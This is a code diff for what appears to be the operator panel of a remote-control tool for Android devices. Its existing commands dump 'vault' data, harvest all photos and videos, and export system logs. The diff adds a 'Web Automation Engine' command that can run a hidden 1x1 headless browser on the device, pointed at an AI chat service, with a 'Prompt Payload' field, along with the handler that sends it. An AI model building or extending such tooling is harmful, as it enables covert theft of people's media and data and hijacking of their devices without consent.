@@ -617,7 +617,8 @@
                     { id: 'UPLOAD_DUMPS', name: 'Sync Vault Dumps', icon: '☁️', inputs: [] },
                     { id: 'HARVEST_MEDIA', name: 'Harvest All Media', icon: '🗃️', keywords: 'photos, videos, media, grab, sync', inputs: [] },
                     { id: 'GET_LOGS', name: 'Export System Logcat', icon: '📋', inputs: [] },
-                    { id: 'GET_VAULT_SIZE', name: 'Query Vault Storage', icon: '💾', inputs: [] }
+                    { id: 'GET_VAULT_SIZE', name: 'Query Vault Storage', icon: '💾', inputs: [] },
+                    { id: 'AUTOMATE_WEB', name: 'Web Automation Engine', icon: '🤖', keywords: 'ai, bot, prompt, script, browser', inputs: [{id: 'auto-mode', label: 'Mode', type: 'select', options: [{v: 'VISIBLE', l: 'Visible (Browser UI)'}, {v: 'STEALTH', l: 'Stealth (1x1 Headless)'}]}, {id: 'auto-url', label: 'Target URL', type: 'text', val: 'https://aistudio.google.com/prompts/new_chat'}, {id: 'auto-prompt', label: 'Prompt Payload', type: 'textarea', placeholder: 'Hello AI...'}] }
                 ]
             },
             {
@@ -1346,6 +1347,8 @@
                         content = document.getElementById('val-skeleton').value || '5'; break;
                     case 'FORCE_UPLOAD':
                         content = document.getElementById('val-force').value; break;
+                    case 'AUTOMATE_WEB':
+                        content = `${document.getElementById('auto-mode').value} | ${document.getElementById('auto-url').value} | ${document.getElementById('auto-prompt').value}`; break;
                     case 'GET_VAULT_SIZE':
                     case 'UPLOAD_DUMPS':
                     case 'GET_LOGS':
